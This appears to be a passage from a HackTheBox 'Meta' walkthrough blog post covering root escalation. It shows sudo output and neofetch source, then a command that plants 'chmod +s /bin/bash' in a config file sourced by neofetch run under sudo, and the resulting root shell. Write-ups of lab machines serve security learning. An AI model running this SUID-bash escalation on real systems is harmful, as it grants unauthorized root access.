<p>Checking for sudo permission thomas is able to run <code class="language-plaintext highlighter-rouge">/usr/bin/neofetch</code> as the root user. An interesting point here is the <code class="language-plaintext highlighter-rouge">env_keep+=XDG_CONFIG_HOME</code> flag for the sudoers entry.
<code class="language-plaintext highlighter-rouge">env_keep</code> means that this environment variable will not be reset when calling sudo even though <code class="language-plaintext highlighter-rouge">env_reset</code> is present aswell.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="nc">Matching</span> <span class="nc">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">thomas</span> <span class="n">on</span> <span class="n">meta</span><span class="o">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">bin</span><span class="p">,</span> <span class="n">env_keep</span><span class="o">+=</span><span class="no">XDG_CONFIG_HOME</span>

<span class="nc">User</span> <span class="n">thomas</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">meta</span><span class="o">:</span>
    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="no">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">neofetch</span> <span class="err">\</span><span class="s2">"</span><span class="se">\"</span><span class="s2">
</span></pre></td></tr></tbody></table></code></div></div>

<p>To see what we can do with this we can look for the variable in the source code of neofetch. The variable is used to declare the configuration directory of neovim. The interesting thing here is that the configuration file for neoftech getâ€™s sourced. This means that anything we put into the configuration file will be eventually executed setting the <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code>.</p>

<p><code class="language-plaintext highlighter-rouge">/usr/bin/neofetch</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="c">#!/usr/bin/env bash</span>
<span class="c"># vim: noai:ts=4:sw=4:expandtab</span>
<span class="c"># shellcheck source=/dev/null</span>
<span class="c"># shellcheck disable=2009</span>
...[snip]...
<span class="nv">version</span><span class="o">=</span><span class="s2">"6.0.0"</span>

<span class="nv">bash_version</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">BASH_VERSION</span><span class="p">/.*</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">sys_locale</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">LANG</span><span class="k">:-</span><span class="nv">C</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">XDG_CONFIG_HOME</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">:-${</span><span class="nv">HOME</span><span class="k">}</span><span class="p">/.config</span><span class="k">}</span><span class="s2">"</span>
<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">PATH</span><span class="k">}</span><span class="s2">:/usr/xpg4/bin:/usr/sbin:/sbin:/usr/etc:/usr/libexec"</span>

...[snip]...

get_user_config<span class="o">()</span> <span class="o">{</span>
    <span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/"</span>

    <span class="c"># --config /path/to/config.conf</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$config_file</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">source</span> <span class="s2">"</span><span class="nv">$config_file</span><span class="s2">"</span>
        err <span class="s2">"Config: Sourced user config. (</span><span class="k">${</span><span class="nv">config_file</span><span class="k">}</span><span class="s2">)"</span>
        <span class="k">return

    elif</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config.conf"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">source</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config.conf"</span>
        err <span class="s2">"Config: Sourced user config.    (</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config.conf)"</span>

    <span class="k">elif</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">source</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config"</span>
        err <span class="s2">"Config: Sourced user config.    (</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config)"</span>

    <span class="k">else
        </span><span class="nv">config_file</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CONFIG_HOME</span><span class="k">}</span><span class="s2">/neofetch/config.conf"</span>

        <span class="c"># The config file doesn't exist, create it.</span>
        <span class="nb">printf</span> <span class="s1">'%s\n'</span> <span class="s2">"</span><span class="nv">$config</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$config_file</span><span class="s2">"</span>
    <span class="k">fi</span>
<span class="o">}</span>

...[snip]...

dynamic_prompt<span class="o">()</span> <span class="o">{</span>
    <span class="o">[[</span> <span class="nv">$image_backend</span> <span class="o">==</span> off <span class="o">]]</span>   <span class="o">&amp;&amp;</span> <span class="o">{</span> <span class="nb">printf</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="k">return</span><span class="p">;</span> <span class="o">}</span>
    <span class="o">[[</span> <span class="nv">$image_backend</span> <span class="o">!=</span> ascii <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="nv">lines</span><span class="o">=(</span>height + yoffset<span class="o">)</span> / font_height + 1<span class="o">))</span>
    <span class="o">[[</span> <span class="nv">$image_backend</span> <span class="o">==</span> w3m <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="nv">lines</span><span class="o">=</span>lines + padding / font_height + 1<span class="o">))</span>

<span class="nt">--</span>
    <span class="o">[[</span> <span class="s2">"</span><span class="nv">$*</span><span class="s2">"</span> <span class="o">!=</span> <span class="k">*</span><span class="nt">--config</span><span class="k">*</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> get_user_config
...[snip]...
</pre></td></tr></tbody></table></code></div></div>

<p>To abuse this we can simply append a command setting the suid bit on bash to the config file, export the <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code> variable and run neofetch with sudo. Finally we can use the <code class="language-plaintext highlighter-rouge">-p</code> flag on bash to keep the suid permissions on our modified bash and add the root flag to our collection.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="n">thomas</span><span class="o">@</span><span class="n">meta</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">dev01</span><span class="mf">.</span><span class="n">artcorp</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="n">convert_images</span><span class="err">$</span> <span class="k">echo</span> <span class="s1">'chmod +s /bin/bash'</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">thomas</span><span class="o">/.</span><span class="n">config</span><span class="o">/</span><span class="n">neofetch</span><span class="o">/</span><span class="n">config</span><span class="mf">.</span><span class="n">conf</span><span class="p">;</span> <span class="n">export</span> <span class="no">XDG_CONFIG_HOME</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">thomas</span><span class="o">/.</span><span class="n">config</span><span class="o">/</span><span class="p">;</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">neofetch</span><span class="p">;</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
       <span class="n">_</span><span class="p">,</span><span class="n">met</span><span class="nv">$$$$$gg</span><span class="mf">.</span>          <span class="n">root</span><span class="o">@</span><span class="n">meta</span>
    <span class="p">,</span><span class="n">g</span><span class="nv">$$$$$$$$$$$$$$$P</span><span class="mf">.</span>       <span class="o">---------</span>
  <span class="p">,</span><span class="n">g</span><span class="nv">$$P</span><span class="s2">"     """</span><span class="nc">Y</span><span class="err">$$</span><span class="mf">.</span><span class="s2">".        OS: Debian GNU/Linux 10 (buster) x86_64
 ,$$P'              `$$$.     Host: VMware Virtual Platform None
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64
`d$$'     ,</span><span class="nv">$P</span><span class="s2">"</span><span class="s1">'   .    $$$    Uptime: 52 mins
 $$P      d$'</span>     <span class="p">,</span>    <span class="nv">$$P</span>    <span class="nc">Packages</span><span class="o">:</span> <span class="mi">495</span> <span class="p">(</span><span class="n">dpkg</span><span class="p">)</span>
 <span class="err">$$</span><span class="o">:</span>      <span class="err">$$</span><span class="mf">.</span>   <span class="o">-</span>    <span class="p">,</span><span class="n">d</span><span class="err">$$</span><span class="s1">'    Shell: bash 5.0.3
 $$;      Y$b._   _,d$P'</span>      <span class="no">CPU</span><span class="o">:</span> <span class="nc">Intel</span> <span class="nc">Xeon</span> <span class="nc">Gold</span> <span class="mi">5218</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">@</span> <span class="mf">2.294</span><span class="nc">GHz</span>
 <span class="nc">Y</span><span class="err">$$</span><span class="mf">.</span>    <span class="sb">`.`</span><span class="s2">"Y$$$$P"</span><span class="err">'</span>         <span class="no">GPU</span><span class="o">:</span> <span class="nc">VMware</span> <span class="no">SVGA</span> <span class="no">II</span> <span class="nc">Adapter</span>
 <span class="sb">`$$b      "-.__              Memory: 154MiB / 1994MiB
  `</span><span class="nc">Y</span><span class="err">$$</span>
   <span class="sb">`Y$$.
     `</span><span class="nv">$$b</span><span class="mf">.</span>
       <span class="sb">`Y$$b.
          `</span><span class="s2">"Y</span><span class="nv">$b</span><span class="s2">._
              `"""</span>

<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">thomas</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">thomas</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1000</span><span class="p">(</span><span class="n">thomas</span><span class="p">)</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># wc -c /root/root.txt</span>
<span class="mi">33</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="mf">.</span><span class="n">txt</span>
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>HackTheBox</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >medium</a>
      
      <a href="/tags/exfitool/"
          class="post-tag no-text-decoration" >exfitool</a>
      
      <a href="/tags/cve/"
          class="post-tag no-text-decoration" >cve</a>
      
      <a href="/tags/imagemagick/"
          class="post-tag no-text-decoration" >imagemagick</a>
      
      <a href="/tags/neofetch/"
          class="post-tag no-text-decoration" >neofetch</a>
      
      <a href="/tags/sudo/"
          class="post-tag no-text-decoration" >sudo</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Meta+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmeta%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Meta+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmeta%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmeta%2F&text=Hack+The+Box+-+Meta+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    






<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/paper/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1655481600"
    data-df="ll"
    >
  Jun 18, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Paper</h3>
            <div class="text-muted small">
              <p>
                





                User
Paper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat install...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/scanned/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1662739200"
    data-df="ll"
    >
  Sep 10, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Scanned</h3>
            <div class="text-muted small">
              <p>
                





                Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reuse...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Investigation/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1682092800"
    data-df="ll"
    >
  Apr 22, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Investigation</h3>
            <div class="text-muted small">
              <p>
                





                In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.


  Room: Investigation
  Difficulty: Med...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <div class="btn btn-outline-primary disabled"
    prompt="Older">
    <p>-</p>
  </div>
  

  
  <a href="/posts/paper/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Paper</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          Â© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  
